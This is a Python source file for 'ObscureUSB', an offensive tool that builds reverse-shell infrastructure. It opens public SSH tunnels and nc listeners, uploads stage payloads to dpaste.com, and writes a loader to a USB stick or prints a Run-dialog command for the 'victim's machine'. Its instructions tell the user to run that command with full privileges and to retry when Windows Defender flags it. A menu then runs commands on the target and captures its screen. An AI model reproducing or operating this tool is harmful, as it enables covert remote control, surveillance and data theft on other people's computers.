# ——— Dependencies
import os
from subprocess import DEVNULL, run, check_output
import sys
from time import sleep
import tempfile

# ——— Configuration and constants
from conf import *

# ——— Print ASCII name for Obscure
def print_name():
    print("\033[31m\n         __                            \n  ____  / /_  ____________  __________ \n / __ \\/ __ \\/ ___/ ___/ / / / ___/ _ \\\n/ /_/ / /_/ (__  ) /__/ /_/ / /  /  __/\n\\____/_.___/____/\\___/\\__,_/_/   \\___/ \n\033[0m")

# ——— Authenticate
if os.geteuid() == 0:
    print("\u001b[31mDo not run as root!")
    sys.exit()
run(["clear"])
print_name()
print("\u001b[34mAuthenticating...\033[0m")
run(["sudo", "echo", "\033[32mReady!\n\033[90m"])

# ——— Check tmux pane to determine if a connection has been established
def check_for_connection(first_port):
    connection_established = False
    pane_capture = None
    try:
        pane_capture = check_output(["tmux", "capture-pane", "-pt", f"listener-{first_port}"], stderr=DEVNULL).decode("utf-8")
    except:
        return False

    last_listening = pane_capture.lower().rfind("listening on")
    last_connection = pane_capture.lower().rfind("connection received")

    if last_listening <= last_connection and pane_capture is not None: # ensure that a connection is still ongoing
        connection_established = True

    return connection_established

# ——— Create a new session to connect the target to the attacker's machine
def make_new_session():
    # ——— Clear previous sessions
    run(["tmux","kill-server"], stderr=DEVNULL)
    print(f"{C_MARK} Cleared previous panes.")

    # ——— Ask to start new session
    print("\u001b[33mInitiate a new session?\u001b[90m (Y/N)\u001b[0m", end=" ")
    response = input().strip().lower()
    if response != "y":
        print(f"{X_MARK} Session initiation cancelled.")
        sys.exit()
    print("\u001b[90m",end="")

    # ——— Allow ports on local firewall
    for port in LOCAL_PORTS:
        check_output(["sudo", "ufw", "allow", str(port)], stderr=DEVNULL)
    print(f"{C_MARK} Modified local firewall.")

    # ——— Start new sessions
    for port in LOCAL_PORTS:
        run(["tmux", "new-session", "-d", "-s", f"pinggy-tcp-{port}"])
        run(["tmux", "send-keys", "-t", f"pinggy-tcp-{port}", f"sshpass -p '' ssh -p 443 -R0:localhost:{port} qr+tcp@free.pinggy.io", "ENTER"])
    print(f"{C_MARK} Started pinggy tunnels.")

    # ——— Gather and parse tunnel information
    tunnels_exist = False
    middlemen = {}
    while not tunnels_exist:
        try:
            middlemen = {}

            for port in LOCAL_PORTS: # Read tunnel information corresponding to each local port
                tunnel_info = check_output(["tmux", "capture-pane", "-pt", f"pinggy-tcp-{port}"], stderr=DEVNULL).decode("utf-8")
                
                if("tcp://" in tunnel_info):
                    middlemen[str(port)] = tunnel_info.split("tcp://")[1].split("\n")[0] # Extract the public URL for the tunnel
            
            if len(middlemen) == len(LOCAL_PORTS):
                tunnels_exist = True
        except:
            sleep(1)
    print(f"{C_MARK} Retrieved and parsed tunnel information.")
    print(middlemen)

    # ——— Begin listening on local ports
    for i,port in enumerate(LOCAL_PORTS):
        run(["tmux", "new-session", "-d", "-s", f"listener-{port}"])
        
        if i == 1: # If the second port, set up listener to capture screenshot
            run(["tmux", "send-keys", "-t", f"listener-{port}", f"while true; do nc -q 0 -lvnp {port} > out/capture.png; feh -x out/capture.png --geometry 1200x800+10-10 -. -Z --image-bg black; sleep 1; done", "ENTER"])
        
        else: # Otherwise, set up normal listener
            run(["tmux", "send-keys", "-t", f"listener-{port}", f"while true; do nc -lvnp {port}; sleep 1; done", "ENTER"])
    print(f"{C_MARK} Began listening on local ports.")

    # ——— Generate first paste
    with open(f"{THIS_DIRECTORY}/dev/paste_01.txt", "r") as f:
        paste1 = f.read()
        f.close()

    first_port = LOCAL_PORTS[0]
    first_tcp = middlemen[str(first_port)]
    paste1 = paste1.replace(">>TCP<<", first_tcp.split(":")[0])
    paste1 = paste1.replace(">>PORT<<", first_tcp.split(":")[1])
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(paste1.encode("utf-8"))
        tmp.flush()
        paste1_url = check_output(f"curl -F 'content=<{tmp.name}' https://dpaste.com/api/v2/", shell=True, stderr=DEVNULL)
        paste1_url = paste1_url.decode("utf-8").strip().split("://")[1] + ".txt"

    print(f"{C_MARK} Uploaded first dpaste.")

    sleep(1)

    # ——— Generate second paste
    with open(f"{THIS_DIRECTORY}/dev/paste_02.txt", "r") as f:
        paste2 = f.read()
        f.close()

    second_port = LOCAL_PORTS[1]
    second_tcp = middlemen[str(second_port)]
    paste2 = paste2.replace(">>TCP<<", second_tcp.split(":")[0])
    paste2 = paste2.replace(">>PORT<<", second_tcp.split(":")[1])
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(paste2.encode("utf-8"))
        tmp.flush()
        paste2_url = check_output(f"curl -F 'content=<{tmp.name}' https://dpaste.com/api/v2/", shell=True, stderr=DEVNULL)
        paste2_url = paste2_url.decode("utf-8").strip().split("://")[1] + ".txt"

    print(f"{C_MARK} Uploaded second dpaste.")

    sleep(1)

    # ——— Generate main paste
    with open(f"{THIS_DIRECTORY}/dev/paste_00.txt", "r") as f:
        paste0 = f.read()
        f.close()
    paste0 = paste0.replace(">>URL1<<", paste1_url)
    paste0 = paste0.replace(">>URL2<<", paste2_url)
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(paste0.encode("utf-8"))
        tmp.flush()
        paste0_url = check_output(f"curl -F 'content=<{tmp.name}' https://dpaste.com/api/v2/", shell=True, stderr=DEVNULL)
        paste0_url = paste0_url.decode("utf-8").strip().split("://")[1] + ".txt"

    print(f"{C_MARK} Uploaded main dpaste.")

    # ——— Write USB scripts
    with open(f"{THIS_DIRECTORY}/usb_config.txt", "r") as f:
        config_usb = f.read().strip()
        f.close()

    with open(f"{THIS_DIRECTORY}/dev/manual.txt", "r") as f:
        manual_run = f.read().strip()
        f.close()

    with open(f"{THIS_DIRECTORY}/dev/usb.txt", "r") as f:
        usb_template = f.read()
        f.close()

    if config_usb != "MANUAL": # Default mode, writing to USB

        print("\u001b[34mInsert USB and press Enter.\u001b[90m",end=" ")
        wait = input()

        # ——— Attempt to write scripts to USB, retrying on failure
        successfully_wrote = False
        error_count_write = 0
        error_count_eject = 10
        while not successfully_wrote:
            try:
                with open(f"{config_usb}", "w") as f:
                    f.write(usb_template.replace(">>URL<<", paste0_url)) # Write to USB
                
                successfully_wrote = True # Successfully wrote to USB without error, exit loop
                continue

            except Exception as e: # Failed to write to USB
                if error_count_write > 0:
                    print("\033[A\033[K",end="")
                
                error_count_write += 1
                print(f"{X_MARK} Error writing to USB... trying again. [{error_count_write}]")
                
                if error_count_write >= error_count_eject:
                    print(f"{X_MARK} Failed to write to USB after {error_count_eject} attempts.")
                    sys.exit() # Exit if too many failed attempts to write to USB
    
            sleep(2)

        print(f"{C_MARK} Scripts wrote to USB.")
        print(
            "\n\u001b[34m" \
            "Remove the USB and insert it into the victim's machine. " \
            "If Windows Defender flags the script, try inserting the USB again.\n\u001b[90m"
        )
    
    else: # Manual mode
        # ——— If manual mode configured, print the script for the user to copy onto Windows Run dialog themselves
        print("\n\u001b[34m" \
            "Manual mode specified, not writing to USB. " \
            "Type the script below onto the target machine's Run dialog. " \
            "Once typed into the field, use CTRL + SHIFT + ENTER to run with full privileges. " \
            "If Windows Defender flags the script, try running it again.\u001b[90m\n"
        )
        print("\u001b[0m" + manual_run.replace(">>URL<<", paste0_url) + "\n")

    # ——— Wait for connection
    print("\u001b[33mWaiting for connection to target...\u001b[90m")

    connection_established = False
    while not connection_established: # Loop until connection info is found in tmux pane, indicating a successful connection from the target
        pane_capture = check_output(["tmux", "capture-pane", "-pt", f"listener-{first_port}"]).decode("utf-8")
        if "connection received" in pane_capture.lower():
            connection_established = True
            continue
        sleep(1)

    create_interface(True) # Once connection is established, create interface for user to interact with target

def run_command(queued_command):
    c_info = ""

    # ——— Handle simple commands
    if type(queued_command) is str:
        run(["tmux", "send-keys", "-t", f"listener-{LOCAL_PORTS[0]}", queued_command, "ENTER"]) # Run the selected command on the target
        return c_info

    # ——— Handle complex (tuple) commands
    run(queued_command[1], shell=True) # Run any local commands necessary for the option
    run(["tmux", "send-keys", "-t", f"listener-{LOCAL_PORTS[0]}", queued_command[0], "ENTER"]) # Run the selected command on the target
    
    # ——— Capture tmux output if requested
    if queued_command[2] == "?CAPTURED_TMUX":
        rev_capture_init = "\u001b[90m" + check_output(["tmux", "capture-pane", "-pt", f"listener-{LOCAL_PORTS[0]}"]).decode("utf-8")
        rev_capture = rev_capture_init
        
        rev_attempts = 1
        rev_different = False

        # ——— Wait until tmux output changes
        while(not rev_different and rev_attempts < 5):
            rev_capture = "\u001b[90m" + check_output(["tmux", "capture-pane", "-pt", f"listener-{LOCAL_PORTS[0]}"]).decode("utf-8")
            
            if(rev_capture != rev_capture_init): # If the tmux output has changed, exit loop
                rev_different = True
                continue
            
            if(rev_attempts != 1):
                print("\033[A\033[K",end="")
            print(f"\u001b[33mRetrieving command output... \u001b[90m[{rev_attempts}]")
            
            rev_attempts += 1
            sleep(1)
        
        rev_capture = rev_capture.replace("\n\n", "\n").strip() + "\u001b[0m"
        c_info = "\u001b[90m\n" + '\n'.join(rev_capture.splitlines()[-10:]) + "\n\u001b[90m[...]" # Process captured tmux output and save to variable
    
    # ——— Handle end of connection if requested
    elif "<ENDOF_CONNECTION>" in queued_command[2]:
        c_info = queued_command[2].replace("<ENDOF_CONNECTION>", "")
        print(f"{C_MARK} Connection broken!")
        sleep(1)
        run(["tmux","kill-server"], stderr=DEVNULL)
        sys.exit()

    # ——— Handle any other info to be returned to the user
    else:
        c_info = queued_command[2]
    
    return c_info

# ————————————————————————————————————————————————————————— #

# ——— Create an interface for the user to interact with the target
def create_interface(now_established=False):

    # ——— Initiate a structure for all user actions
    options = GLOBAL_OPTIONS

    # ——— Use print statements and input to create a navigable interface
    command_sent = False
    command_info = ""
    show_connect_info = now_established

    while True:
        current = options # Start at the top level of options
        queued_command = ""

        while type(current) is dict: # Loop through option structure until a command is reached

            run(["clear"])
            print("\u001b[34m[ ObscureUSB - Reverse Shell Menu ]\u001b[90m\n")

            if(show_connect_info): # Show connection message once upon initial connection
                show_connect_info = False
                print(f"{C_MARK} \u001b[32mConnection established!\n\u001b[90m")
                sleep(1)

            # ——— If at the top level, perform checks
            if current == options:
                
                if command_sent:
                    # ——— State whether the command was sent successfully or if the connection was lost
                    if(not check_for_connection(LOCAL_PORTS[0])):
                        print("\u001b[31mConnection lost! Restarting...\u001b[90m")
                        sleep(3)
                        run(["clear"])
                        print_name()
                        return

                    print("\u001b[32mCommand sent successfully!\u001b[90m")
                    if command_info != "":
                        print(f"\u001b[32m{command_info}\u001b[90m") # Print any relevant info about the sent command
                    print()

                    command_sent = False
                    command_info = ""

            # ——— Handle text input options
            if('TEXT' in current):
                print("\u001b[34mInput text for selected option")
                print("\u001b[90mType 'exit' or 'back' to quit or go back.\u001b[0m")
                valid_input = False

                # ——— Receive and parse user text input
                while not valid_input:
                    user_input = input()
                    
                    if user_input.lower() == "exit": # Handle an exit command
                        print("\n\u001b[90mExited, though the connection is likely still active.\n\u001b[90mReopen the connection by running Obscure again.")
                        sys.exit()

                    if user_input.lower() == "back": # Handle a back command, returning to top level of options
                        current = options
                        valid_input = True
                        run(["clear"])
                        continue

                    if user_input.strip() != "": # Handle valid text input
                        valid_input = True
                        current = current[list(current.keys())[0]] # Get command associated with the text input option

                        # ——— Handle both complex and simple commands accordingly
                        if type(current) is tuple:
                            queued_command = (current[0].replace(">>TEXT<<", user_input), current[1], current[2])
                        else:
                            queued_command = current.replace(">>TEXT<<", user_input)
                    
                    else: # Handle invalid text input
                        print("\033[A\033[K"*3,end="")
                        print("\u001b[34mInput text for selected option.",end=" ")
                        print("\u001b[31m(CANNOT BE EMPTY)\u001b[90m")
                        print("\u001b[90mType 'exit' or 'back' to quit or go back.\u001b[0m")
                continue # Skip the rest of the loop

            # ——— Handle regular options
            for i, option in enumerate(current.keys()): # List all possible options at the current level
                s = "   " if i < 9 else "  " # Adjust spacing for digit count
                print(f"{s}\u001b[33m[{i+1}]\u001b[0m {option}\u001b[90m")

            if current == options:
                print("\n\u001b[34mSelect an option to interact with the target.")
                print("\u001b[90mType 'exit' to quit.\u001b[0m")
            else:
                print("\n\u001b[34mSelect an action to execute on the target.")
                print("\u001b[90mType 'exit' or 'back' to quit or go back.\u001b[0m")

            valid_choice = False

            # ——— Receive and parse user option choice
            while not valid_choice:
                choice = input().lower()

                if choice == "exit": # Handle an exit command
                    print("\n\u001b[90mExited, though the connection is likely still active.\n\u001b[90mReopen the connection by running Obscure again.")
                    sys.exit()
                
                if choice == "back" and current != options: # Handle a back command, returning to top level of options
                    current = options
                    valid_choice = True
                    run(["clear"])
                    continue

                if choice.isdigit() and 1 <= int(choice) <= len(options): # Handle a valid choice
                    valid_choice = True
                    current = current[list(current.keys())[int(choice)-1]] # Update current to the option chosen by the user

                    # ——— Set queued command if the current option is a command, rather than a sub-menu
                    if type(current) is not dict:
                        queued_command = current
                    
                else: # Handle invalid choice
                    if current == options:
                        print("\033[A\033[K"*4,end="")
                        print("\n\u001b[34mSelect an option to interact with the target.",end=" ")
                        print("\u001b[31m(SELECT NUMBER)\u001b[90m")
                        print("\u001b[90mType 'exit' to quit.\u001b[0m")
                    else:
                        print("\033[A\033[K"*4,end="")
                        print("\n\u001b[34mSelect an action to execute on the target.", end=" ")
                        print("\u001b[31m(SELECT NUMBER)\u001b[90m")
                        print("\u001b[90mType 'exit' or 'back' to quit or go back.\u001b[0m")
        
        # ——— Once a command is selected, execute it on the target through tmux and nc
        print("\n\u001b[33mExecuting command on target...\u001b[90m")
        sleep(1)
        
        # ——— Run the command and capture any relevant command information to display
        command_sent = True
        command_info = run_command(queued_command)

# ————————————————————————————————————————————————————————— #

def main():
    # ——— Check for valid existing sessions
    allow_new_sessions = True
    connection_established = check_for_connection(LOCAL_PORTS[0])
    
    if connection_established:
        print("\u001b[34mExisting session with active connections found!\u001b[90m")
        print("\u001b[33mDo you wish to reconnect to this session? \u001b[90m(Y/N)\u001b[0m", end=" ")
        choice = input().lower()
        print("\u001b[90m",end="")
        if choice == "y":
            create_interface()
    else:
        print("\u001b[90mNo existing, active sessions found.")
    
    # ——— If no valid sessions, start one
    while allow_new_sessions:
        make_new_session()

# ——— Run main function
if __name__ == "__main__":
    main()